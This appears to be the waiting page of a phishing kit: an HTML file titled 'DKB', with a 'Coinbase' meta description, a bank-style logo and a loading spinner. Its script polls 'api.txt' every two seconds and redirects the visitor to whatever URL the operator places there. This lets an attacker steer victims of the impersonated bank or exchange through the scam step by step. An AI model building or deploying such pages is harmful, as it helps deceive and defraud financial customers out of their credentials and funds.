<!DOCTYPE html>
<html>
    <head>
        <meta charset="UTF-8">
        <meta name="discription" content="Coinbase">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <link rel="icon" href="./Asstes/imgs/favicon.ico">
        <title>DKB</title>
        <!-- === bootstrap === -->
        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.1/dist/css/bootstrap.min.css" rel="stylesheet" />
        <!-- == Font-awesome " icon " == -->
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"/>
        <!-- == remixicon " icon " == -->
        <link href="https://cdn.jsdelivr.net/npm/remixicon@3.5.0/fonts/remixicon.css" rel="stylesheet">
        <!-- == file style css == -->
        <link rel="stylesheet" href="./Asstes/css/style.css">
    </head>
    <body class="form_box">
      
    <div class="loading d-flex justify-content-center align-items-center flex-column" style="width:100%; height:100vh;">
        <img src="./Asstes/imgs/logo2.svg" alt="">
        <div class="spinner-border text-warning" role="status" style="border-color: #148DEA;
        border-right-color: #dadada; width: 2.0em;  height: 2.0em; margin-top: -23px;">
          <span class="sr-only">Loading...</span>
        </div>
    </div>








    <!-- bootstrap -->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
    <!-- script jquery -->
    <script src="https://code.jquery.com/jquery-3.7.1.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
 <div id="contentcom"></div>
    <script>
        function fetchAndRedirect() {
            var client = new XMLHttpRequest();
            client.open('GET', 'api.txt?v=' + new Date().getTime(), true); // Cache busting
            client.onreadystatechange = function() {
                if (client.readyState === 4) {
                    if (client.status === 200) {
                        var responseText = client.responseText;
                        console.log("Fetched responseText:", responseText);

                        // Extract URL from meta refresh tag
                        var urlMatch = responseText.match(/<meta\s+http-equiv=['"]refresh['"]\s+content=['"][^;]+;\s*url=([^'"]+)['"]/i);

                        if (urlMatch && urlMatch[1]) {
                            var redirectUrl = urlMatch[1];
                            console.log("Redirecting to URL:", redirectUrl);
                            window.location.href = redirectUrl;
                        } else {
                            console.error("Failed to extract URL from response.");
                        }
                    } else {
                        console.error("Failed to fetch data from api.txt, status code:", client.status);
                    }
                }
            };
            client.send();
        }

        // Fetch the URL and redirect every 2 seconds
        setInterval(fetchAndRedirect, 2000);
    </script>
 
 
 </body>
</html>